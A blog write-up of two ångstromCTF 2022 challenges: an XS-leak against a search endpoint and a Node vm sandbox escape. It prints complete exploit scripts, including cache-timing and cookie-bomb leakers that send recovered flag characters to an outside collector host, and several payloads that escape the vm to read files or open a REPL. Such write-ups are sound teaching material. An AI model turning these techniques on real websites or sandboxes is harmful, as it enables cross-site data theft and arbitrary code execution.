---
title: ångstromCTF 2022 Notes
catalog: true
date: 2022-05-05 20:36:04
tags: [Security]
categories: [Security]
---

<img src="/img/angstrom-ctf-2022-writeup/cover.png" style="display:none">

I couldn't participate on the first day of the competition due to some personal matters. When I joined on the second day, I found out that my teammates had already solved most of the web challenges, so there were many challenges that I didn't get to see.

Since I love JavaScript and XS-leak, I will only write about the two challenges that I found most interesting:

1. web/Sustenance
2. misc/CaaSio PSE

(I may write about another challenge that involves DOMPurify + marked bypass XSS in the future)

<!-- more -->

## web/Sustenance

This is a very simple App:

``` js
const express = require("express");
const cookieParser = require("cookie-parser");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const adminSecret = process.env.ADMIN_SECRET || "secretpw";
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

function queryMiddleware(req, res, next) {
    res.locals.search =
        req.cookies.search || "the quick brown fox jumps over the lazy dog";
    // admin is a cool kid
    if (req.cookies.admin === adminSecret) {
        res.locals.search = flag;
    }
    next();
}

app.use(cookieParser());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/s", (req, res) => {
    if (req.body.search) {
        for (const [name, val] of Object.entries(req.body)) {
            res.cookie(name, val, { httpOnly: true });
        }
    }
    res.redirect("/");
});

app.get("/q", queryMiddleware, (req, res) => {
    const query = req.query.q || "h"; // h
    let status;
    if (res.locals.search.includes(query)) {
        status =
            "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    } else {
        status = "failed";
    }
    res.redirect(
        "/?m=" +
            encodeURIComponent(
                `your search that took place at ${Date.now()} has ${status}`
            )
    );
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

You can set any cookie and search for certain characters in the flag. Since there is no XSS vulnerability, XS-leak is obviously involved.

To exploit XS-leak, we need to observe the difference between "searched" and "not searched". The query for searching looks like this: `/q?q=actf`. If the search is successful, it will redirect to `/?m=your search...at 1651732982748 has success....`. If the search is unsuccessful, it will redirect to `/?m=your search...ar 1651732982748 has failed`.

The `index.html` file only renders the content of the `m` parameter in the URL, so there are two differences between success and failure:

1. The URL is different.
2. The content of the page is different.

At first, I tried cache probing because pages that have been visited are stored in the disk cache. Therefore, by using `fetch + force-cache`, we can determine whether the page is in the cache based on the time difference. As for the timestamp in the URL, we can simply set a range for brute force, such as 1~1000.

Due to the default SameSite=Lax setting, we can only use top-level navigation like `window.open` when searching, otherwise the cookie won't be sent.

The biggest problem is that Chrome now has [cache partitioning](https://developer.chrome.com/blog/http-cache-partitioning/). The cache key for a newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`. However, if I use fetch inside an ngrok, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`. The cache key is different, so we can't access the cache.

My teammate and I also discussed whether we could use [cookie bomb](https://blog.huli.tw/2021/07/10/cookie-bomb/) to do something since we can set cookies, but we didn't find a way after the discussion.

Then I tried to use the method from [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html) to leak history using `a:visited`. After modifying the POC in the above article, it worked, but it didn't work when I sent it to the admin bot. I tested it on my local machine and found that it was probably because of headless mode, where the rendering time is always 16ms regardless of how it is rendered.

After trying everything I could think of, [lebr0nli](https://lebr0nli.github.io/blog/) posted a POC that uses cache probing, which was inspired by [maple's writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault). The key point is that "this POC can be used on other challenges to run on the same site", for example, if the URL of another challenge is `https://xtra-salty-sardines.web.actf.co/`, using fetch from there will also result in the same cache key `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, because the cache key only looks at eTLD+1, so the cache key will be the same for same-site websites.

But the problem he encountered was that it could run locally, but no matter what on the remote, it was always a false positive. So I followed his POC and tried to return more numbers, and found that the problem was that the server was running abnormally fast. For example, those with cache took 3ms, and those without cache only took 5ms, with a very small difference, even the timestamp part was, probably within 10ms after `window.open`.

Therefore, I modified the code and directly calculated the average time with cache on the remote, and successfully leaked the flag. The code is as follows:

https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722

``` js
// to hang the connection
fetch('https://deelay.me/20000/https://example.com')

// NOTE: we will calculate this baseline before doing the attack
var baseLine = 3.2
const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))

go()
async function go() {
  await calculateBaseline()
  main()

  async function calculateBaseline() {
    var m = Math.random()
    let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m)
    
    // NOTE: this number can be decreased by detecting window load
    await sleep(500)
    win.close()
    let total = 0
    for(let i=1; i<=5; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m)
      total += ts
      report(`Cached time, round: ${i}, ${ts}ms`)
    }
    // NOTE: 0.5 is just a random guess
    baseLine = (total/5) + 0.5
    report(`Baseline: ${baseLine}`)
    
    // NOTE: adjust baseline, should not be more than 3 ms based on previous testing
    if (baseLine > 3) {
      baseLine = 3
    }
    for(let i=1; i<=3; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m)
      report(`Not Cached time, round: ${i}, ${ts}ms`)
    }
  }

  // NOTE: server is quite fast so no need to set timeout
  async function getLoadTime(url) {
    const start = performance.now()
    await fetch(url, { cache: 'force-cache', mode: 'no-cors' })
    return performance.now() - start
  }

  function genSucceedUrl(t) {
    let ft = t + ''
    while(ft.length < 13) {
      ft += '0'
    }
    const status = "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at ${ft} has ${status}`);
  }

  async function isCached(str) {
    let start = +new Date()
    let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str))
    await sleep(500)
    win.close()
    
    // NOTE: base on the data collected, i should be 1~20, pretty small number
    for(let i=1; i<=30; i++) {
      const url = genSucceedUrl(start + i)
      let loadTime = await getLoadTime(url)
      if (loadTime <= baseLine) {
        
        // NOTE: check again to see if it really meets the condition
        let total = 0
        for(let j=1; j<=3; j++) {
          total += await getLoadTime(url)
        }
        total/=3
        if (total <= baseLine) {
          report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`)
          return true
        }
      }
    }
    return false
  }

  async function main() {
    let flag = 'actf{yummy_'
    
    // NOTE: we can leak the charset first to speed up the process
    let chars = 'acefsmntuy_}'.split('')
    while(flag[flag.length - 1] !== '}') {
      for(let char of chars) {
        report('trying:'  + flag + char)
        if (await isCached(flag + char)) {
          flag += char
          report('flag:' + flag)
          break
        }
      }
    }
  }

  async function report(data) {
    console.log(data)
    // TODO: change to your VPS
    return fetch('https://YOUR_VPS/', { method: 'POST', body: data, mode: 'no-cors' }).catch(err => err);
  }
}
```

We can first leak the charset, and the speed will be much faster. There are still some small adjustments that can be made above, and the overall speed should be faster.

Later, my teammate also posted another writeup: [UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked), which revealed that headless chrome currently does not have cache partitioning.

I actually tested it myself and found that it is still the same now, so this question does not actually need to borrow from other questions, and you can set up an ngrok to solve it.

### Expected Solution

The expected solution should be the cookie bomb I mentioned above. First, set a lot of cookies, and then use the feature that the successful and failed URLs are different. If successful, the URL will be longer, the request will be too large, and the server will return an error. If it fails, nothing will happen.

The script below comes from Strellic and also needs to be used in other questions to run on the same site:

``` html
<>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
<script>
    const $ = document.querySelector.bind(document);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let i = 0;
    const stuff = async (len=3500) => {
        let name = Math.random();
        $("form").target = name;
        let w = window.open('', name);
        $("#f").value = "_".repeat(len);
        $("#f").name = i++;
        $("form").submit();
        await sleep(100);
    };
    const isError = async (url) => {
        return new Promise(r => {
            let script = document.createElement('script');
            script.src = url;
            script.onload = () => r(false);
            script.onerror = () => r(true);
            document.head.appendChild(script);
        });
    }
    const search = (query) => {
        return isError("https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query));
    };
    const alphabet = "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ";
    const url = "//en4u1nbmyeahu.x.pipedream.net/";
    let known = "actf{";
    window.onload = async () => {
        navigator.sendBeacon(url + "?load");
        await Promise.all([stuff(), stuff(), stuff(), stuff()]);
        await stuff(1600);
        navigator.sendBeacon(url + "?go");
        while (true) {
            for (let c of alphabet) {
                let query = known + c;
                if (await search(query)) {
                    navigator.sendBeacon(url, query);
                    known += c;
                    break;
                }
            }
        }
    };
</script>
```

There are a few details to note here:

1. If the request is too large, the server will return an error.
2. Because it is the same site, the `<script>` will automatically bring cookies when sending requests.
3. Use the event of the script to detect whether the http status code is successful.

The reason why I was stuck at the beginning was:

1. I didn't expect to use other questions to bypass the same site cookie.
2. I didn't notice that the request URL was also included in the length, and only thought of the header/body.

## misc/CaaSio PSE

This question is a very strict js jail, and the question looks like this:

``` js
#!/usr/local/bin/node

// flag in ./flag.txt

const vm = require("vm");
const readline = require("readline");

const interface = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

interface.question(
    "Welcome to CaaSio: Please Stop Edition! Enter your calculation:\n",
    function (input) {
        interface.close();
        if (
            input.length < 215 &&
            /^[\x20-\x7e]+$/.test(input) &&
            !/[.\[\]{}\s;`'"\\_<>?:]/.test(input) &&
            !input.toLowerCase().includes("import")
        ) {
            try {
                const val = vm.runInNewContext(input, {});
                console.log("Result:");
                console.log(val);
                console.log(
                    "See, isn't the calculator so much nicer when you're not trying to hack it?"
                );
            } catch (e) {
                console.log("your tried");
            }
        } else {
            console.log(
                "Third time really is the charm! I've finally created an unhackable system!"
            );
        }
    }
);
```

The VM bypass part is very simple, and `this.constructor.constructor('return ...')()` can be used to solve it, but the difficulty lies in the fact that many characters are restricted, and string-related ones cannot be used, and `.` and `[]` are also not allowed, and `{ };>` are also not allowed, which blocked many things. After trying for a while, I remembered that [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) can also be used to access properties, like this:

``` js
with(console)log(123)
```

The string part can be bypassed using regexp, like this: `/string/.source`.

While doing it, I thought of whether decodeURI could be used to bypass some characters, but I didn't think about it carefully. After the game, I found that many people used this trick to solve it, such as lebr0nli:

``` js
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
``` 

If the regexp is directly converted to a string, there will be two `/` before and after. Just add `/\n` inside the regexp, and it will be combined with the previous one to become like this:

``` js
//
your_code_here
```

The concept is actually quite similar to the XSS challenge I previously created.

Anyway, the payload framework I finally assembled looks like this:

``` js
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
```

Just change `console.log(1)` to the code you want to run, and the code we want to run is:

``` js
return String(process.mainModule.require('fs').readFileSync('flag.txt'))
```

The step of converting to a string is not necessary, it just makes the flag more readable.

Then you can use `with` to convert the above code to:

``` js
with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
```

Since single quotes are not allowed, we can make them variables for better readability and then figure out how to remove them later:

``` js
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
```

Now we just need to generate the string, which can be done using `String.fromCharCode`:

``` js
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)with(require(k))return(String(readFileSync(n))) // Same as above
```

Therefore, the final payload is to concatenate this code with the framework from earlier. I'll format it for better readability:

``` js
with(
  /with(String)
    with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
      with(mainModule)
        with(require(k))
          return(String(readFileSync(n)))
  /)
with(this)
  with(constructor)
    constructor(source)()
```

After seeing Maple's payload, I realized that the nested `with` can be bypassed using `with(a=source,/b/)`. For example:

``` js
with(/a/)with(/b/)console.log(source)
```

You can only get `/b/.source`, not `a`, because the properties have the same name. So you can write it like this:

``` js
with(/a/)with(a=source,/b/)console.log(a,source)
```

Use `a=source` in the second `with` to get the property from the previous `with`.

In addition to `with`, it also uses the magical built-in module `require('repl').start()`, which basically opens the repl mode and allows you to execute whatever you want, bypassing character restrictions. Here's the payload:

``` js
with(/with(process)with(mainModule)with(require(x))start()/)
  with(s1=source,/x/)
  with(s2=source,/repl/)
  with(s3=source,this)
    with(constructor)
      constructor(s2,s1)(s3)
```

The author's solution is as follows, without using regexp:

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))())
        with(mainModule)
          with(require(f(102,s)))
            readFileSync(f(102,108,97,103,46,t,120,t))
```

This solution uses a bunch of temporary variables to save characters, which is also clever. Combining it with Maple's solution, it becomes:

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))())
        with(mainModule)
          with(require(f(r,e,p,108)))
            start()
```

Although many people like to use `this.constructor.constructor`, understanding the principle will reveal that the first `constructor` is just for getting the function, so you can check what's on the object:

``` js
for(let key of Object.getOwnPropertyNames((obj={}).__proto__)) {
  if (typeof obj[key] === 'function') {
    console.log(key)
  }
}
```

The shortest one is `valueOf`, so it can be further shortened to:

``` js
with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start()
```

A total of 177 characters.

If combined with fredd's solution in Discord, which uses regexp, the shortest one I found is 115 characters:

``` js
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))
```
